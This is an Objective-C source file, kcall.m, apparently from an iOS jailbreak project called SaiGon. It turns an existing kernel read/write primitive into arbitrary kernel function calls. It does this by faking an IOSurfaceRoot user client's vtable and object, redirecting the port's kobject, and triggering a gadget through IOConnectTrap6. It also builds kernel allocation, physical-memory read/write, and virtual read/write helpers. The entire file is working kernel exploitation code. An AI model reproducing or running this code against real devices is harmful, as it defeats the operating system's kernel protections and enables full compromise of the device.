//
//  kcall.m
//  SaiGon
//
//  Created by hoahuynh on 31/01/2024.
//

#import <Foundation/Foundation.h>
#import "kcall.h"
#import "ipc.h"
#import "krw.h"
#import "offsets.h"

uint64_t fake_vtable = 0;
uint64_t fake_client = 0;
static io_connect_t user_client = 0;


uint64_t kcall_handoff(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
        x4 = addr;
        x3 = x0;
        return IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, 0);
}

uint64_t kalloc_handoff(size_t ksize) {//+
        uint64_t r = kcall_handoff(off_container_init + get_kslide(), fake_client + 0x200, ksize / 8, 0, 0, 0, 0);
        if (r == 0) return 0;
            uint32_t low32 = kread32(fake_client + 0x200 + 0x20);
            uint32_t high32 = kread32(fake_client + 0x200 + 0x20 + 0x4);
        return (((uint64_t)high32) << 32) | low32;
}


void install_kernel_primitive(uint64_t cli, uint64_t vtb) {
        kwrite64_kfd(cli + 0x48, kcall_gadget + get_kslide());
        kwrite64_kfd(cli + 0x40, 0x41414141);
        return;
}

uint64_t kalloc(size_t ksize) {
    uint64_t r = kcall(off_container_init + get_kslide(), fake_client != 0 ? fake_client + 0x500 : fake_client + 0x200, ksize / 8, 0, 0, 0, 0, 0);
    if (r == 0) return 0;
    uint64_t kmem = kread64_kfd(fake_client != 0 ? fake_client + 0x500 + 0x20 : fake_client + 0x200 + 0x20);
    return kmem;
}
uint64_t ipc_entry_lookup(mach_port_t port_name) {
    uint64_t task = get_selftask();
    uint64_t itk_space = kread64_kfd(task + off_task_itk_space);
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    uint64_t is_table = kread64_kfd(itk_space + off_ipc_space_is_table);
    uint64_t entry = is_table + port_index * 0x18;
    return entry;
}
uint64_t find_port(mach_port_t port_name) {
    uint64_t entry = ipc_entry_lookup(port_name);
    uint64_t ipc_port = kread64_kfd(entry + 0x0);
    return ipc_port;
}


BOOL setup_client(void) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == 0) {
        printf("[-] Failed to get IOSurfaceRoot service\n");
        return NO;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[-] Failed to open IOSurfaceRoot service\n");
        return NO;
    }
    user_client = conn;
    IOObjectRelease(service);
    
    uint64_t userclient_port = find_port(conn);
//    printf("userclient_port=0x%llx\n", userclient_port);
    uint64_t userclient_addr = kread64_kfd(userclient_port + off_ipc_port_ip_kobject);
 //   printf("userclient_addr=0x%llx\n", userclient_addr);
    uint64_t userclient_vtab = kread64_kfd(userclient_addr);
 //   printf("userclient_vtab=0x%llx\n", userclient_vtab);

    if (fake_vtable == 0)
        fake_vtable = off_empty_kdata_page + get_kslide();
   // printf("[*] fake_vtable: 0x%llx\n", fake_vtable);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_kfd(userclient_vtab + i * 8);
        kwrite64_kfd(fake_vtable + i * 8, data);
    }

    if (fake_client == 0)
        fake_client = off_empty_kdata_page + get_kslide()+0x1000;
   // printf("[*] fake_client: 0x%llx\n", fake_client);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_kfd(userclient_addr + i * 8);
        kwrite64_kfd(fake_client + i * 8, data);
    }
    kwrite64_kfd(fake_client, fake_vtable);
    kwrite64_kfd(userclient_port + off_ipc_port_ip_kobject, fake_client);
    kwrite64_kfd(fake_vtable + 8 * 0xB8, off_add_x0_x0_0x40_ret + get_kslide());
    return YES;
}

void setup_remote_client(io_connect_t conn, pid_t pid, uint64_t *vtb, uint64_t *cli) {
        
        uint64_t userclient_port = port_name_to_ipc_port_for_pid((mach_port_t)conn, pid);
        uint64_t userclient_addr = kread64(userclient_port + off_ipc_port_ip_kobject);
        uint64_t userclient_vtab = kread64(userclient_addr);
        
        uint64_t fakevtb = kalloc_handoff(0x1000);
        uint64_t fakecli = kalloc_handoff(0x1000);
        
        for (int i = 0; i < 0x200; i++) {
            uint64_t data = kread64(userclient_vtab + i * 8);
            kwrite64(fakevtb + i * 8, data);
        }
        for (int i = 0; i < 0x200; i++) {
            uint64_t data = kread64(userclient_addr + i * 8);
            kwrite64(fakecli + i * 8, data);
        }
        kwrite64(fakecli, fakevtb);
        kwrite64(userclient_port + off_ipc_port_ip_kobject, fakecli);
        kwrite64(fakevtb + 8 * 0xB8, off_add_x0_x0_0x40_ret + get_kslide());
        *vtb = fakevtb;
        *cli = fakecli;
    
}

uint64_t clean_dirty_kalloc15x(uint64_t addr, size_t size) {
    for (int i = 0; i < size; i += 8) {
        kwrite64_kfd(addr + i, 0);
    }
    return 0;
}


uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64_kfd(fake_client + 0x40);
    uint64_t offx28 = kread64_kfd(fake_client + 0x48);
    kwrite64_kfd(fake_client + 0x40, x0);
    kwrite64_kfd(fake_client + 0x48, addr);
    
    uint64_t kcall_ret = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64_kfd(fake_client + 0x40, offx20);
    kwrite64_kfd(fake_client + 0x48, offx28);
    return kcall_ret;
}
uint64_t dirty_kalloc(size_t size) {
    uint64_t begin = get_kernproc();
    uint64_t end = begin + 0x40000000;
    uint64_t addr = begin;
    while (addr < end) {
        bool found = false;
        for (int i = 0; i < size; i+=4) {
            uint32_t val = kread32_kfd(addr+i);
            found = true;
            if (val != 0) {
                found = false;
                addr += i; break;
            }
        }
        if (found) {
            return addr;
        }
        addr += 0x1000;
    }
    if (addr >= end) {
        printf("[-] failed to find free space in kernel");
        exit(EXIT_FAILURE);
    }
    return 0;
}


BOOL kcall_init(void) {
    
    // setup user client, dirty kalloc now
    if (!setup_client()) {
        printf("[-] setup_client failed\n");
        exit(EXIT_FAILURE);
        return NO;
    }
    
    usleep(1000);
    uint64_t kmem = kalloc(0x2000);
    if (!kmem) {
        printf("[-] failed to kalloc\n");
        exit(EXIT_FAILURE);
        return NO;
    }
  //  printf("[*] kalloc: 0x%llx\n", kmem);
    
    usleep(1000);
    uint64_t r = off_empty_kdata_page + get_kslide();
    IOServiceClose(user_client);
    user_client = 0;
    uint64_t cleanup_addr = r;
    r = 0;
    fake_client = kmem;
    fake_vtable = kmem+0x1000;

    // clean up kalloc
    usleep(1000);
    clean_dirty_kalloc15x(cleanup_addr, 0x2000);
    
    usleep(1000);
    if (!setup_client()) {
        printf("[-] setup_client failed\n");
        exit(EXIT_FAILURE);
        return NO;
    }
    usleep(10000);
    install_kernel_primitive(fake_client, fake_vtable);
    
   // printf("[*] test new krw\n");
        
    uint32_t magicv = (kread32(get_kslide() + 0xfffffff007004000));
   // printf("[*] magicv: 0x%x\n", magicv);
        if (magicv != 0xfeedfacf) {
            printf("[-] failed to build new primitive\n");
            exit(EXIT_FAILURE);
        }
        
    kwrite64(kmem + 0x900, 0x00c0ffee00c0ffee);
        
    magicv = (kread32(kmem + 0x900));
   // printf("[*] fmagicv: 0x%x\n", magicv);
        if (magicv != 0x00c0ffee) {
            printf("[-] failed to build new primitive\n");
            exit(EXIT_FAILURE);
        }
        uint64_t magicv2 = kalloc_handoff(0x100);
    if (magicv == 0) {
        printf("[-] failed to kalloc_handoff\n");
        exit(EXIT_FAILURE);
    }
        
        return YES;
    
}

uint64_t kvtophys(uint64_t kvaddr){
    uint64_t ret;
    uint64_t src = kvaddr;
    uint64_t kernel_pmap_min = kern_pmap_min;
    uint64_t kernel_pmap_max = kern_pmap_max;
     uint64_t is_virt_src = src >= kernel_pmap_min && src < kernel_pmap_max;
     if(is_virt_src) {
         ret = kcall_handoff(off_pmap_find_phys + get_kslide() , get_kernpmap(), src, 0, 0, 0, 0);
         if(ret <= 0) {
             return 0;
         }
         uint64_t phys_src = ((uint64_t)ret << vm_kernel_page_shift) | (src & vm_kernel_page_mask);
         return phys_src;
     }
     return 0;
     
}

uint64_t kread64_phys(uint64_t pa){
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;

    u.u32[0] = (uint32_t)kcall_handoff(off_ml_phys_read_data + get_kslide(), pa, 4, 0, 0, 0, 0);;
    u.u32[1] = (uint32_t)kcall_handoff(off_ml_phys_read_data + get_kslide(), pa+4, 4, 0, 0, 0, 0);
    return u.u64;
}

void kwrite64_phys(uint64_t pa, uint64_t value) {
    kcall_handoff(off_ml_phys_write_data + get_kslide(), pa, value, 8, 0, 0, 0);
}

uint64_t kread64(uint64_t va) {
    return kread64_phys(kvtophys(va));
}

uint32_t kread32(uint64_t va) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    return u.u32[0];
}

uint16_t kread16(uint64_t va) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    return u.u16[0];
}

uint8_t kread8(uint64_t va) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    return u.u8[0];
}

void kwrite64(uint64_t va, uint64_t val) {
    kwrite64_phys(kvtophys(va), val);
}

void kwrite32(uint64_t va, uint32_t val) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    u.u32[0] = val;
    kwrite64(va, u.u64);
}

void kwrite16(uint64_t va, uint16_t val) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    u.u16[0] = val;
    kwrite64(va, u.u64);
}

void kwrite8(uint64_t va, uint8_t val) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64(va);
    u.u8[0] = val;
    kwrite64(va, u.u64);
}

void kreadbuf(uint64_t va, void* ua, size_t size) {
    uint64_t *v32 = (uint64_t*) ua;
    
    while (size) {
        size_t bytesToRead = (size > 8) ? 8 : size;
        uint64_t value = kread64(va);
        va += 8;
        
        if (bytesToRead == 8) {
            *v32++ = value;
        } else {
            memcpy(ua, &value, bytesToRead);
        }
        
        size -= bytesToRead;
    }
}

void kwritebuf(uint64_t va, const void* ua, size_t size) {
    uint8_t *v8 = (uint8_t*) ua;
    
    while (size >= 8) {
        kwrite64(va, *(uint64_t*)v8);
        size -= 8;
        v8 += 8;
        va += 8;
    }
    
    if (size) {
        uint64_t val = kread64(va);
        memcpy(&val, v8, size);
        kwrite64(va, val);
    }
}
